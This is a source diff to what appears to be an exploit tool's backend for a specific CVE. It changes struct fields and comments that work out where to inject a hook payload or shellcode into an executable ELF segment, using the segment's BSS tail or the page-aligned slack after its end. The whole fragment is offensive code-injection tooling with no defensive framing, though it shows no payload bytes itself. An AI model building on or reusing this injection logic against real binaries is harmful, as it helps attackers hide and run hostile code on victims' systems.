@@ -111,11 +111,14 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         bool has_rela_plt = false;
 
         /* Executable PT_LOAD chosen to host the hook payload. file_offset/size
-         * are p_offset/p_filesz; vaddr is p_vaddr; exec_memsz is p_memsz. The
-         * payload landing site is (file_offset + size, vaddr + size) and is
-         * mapped only while it stays within exec_memsz. */
+         * are p_offset/p_filesz; vaddr is p_vaddr; exec_memsz is p_memsz;
+         * exec_align is p_align. The payload landing site is
+         * (file_offset + size, vaddr + size) and is mapped while it stays
+         * within the segment's BSS tail (exec_memsz) or inside the
+         * page-aligned tail of the file page holding the segment end. */
         ElfRange exec_segment{};
         std::uint64_t exec_memsz = 0U;
+        std::uint64_t exec_align = 0U;
         std::uint16_t exec_segment_index = 0U;
         bool has_exec_segment = false;
     };
@@ -165,8 +168,10 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         std::uint32_t guard_instruction = 0U;     /* skipped guard, else 0 */
         bool guard_skipped = false;
         ElfRange hook_section{}; /* executable section containing hook_vaddr */
-        /* Shellcode landing site: segment end, plus how many bytes still fit
-         * before p_memsz. */
+        /* Shellcode landing site: segment end, plus payload_max_bytes, the
+         * larger of the BSS tail (p_memsz - p_filesz) and the page-aligned tail
+         * of the file page holding the segment end, clamped so it cannot cross
+         * EOF or another PT_LOAD's page-aligned mapping. */
         std::uint64_t payload_file_offset = 0U;
         std::uint64_t payload_vaddr = 0U;
         std::uint64_t payload_max_bytes = 0U;
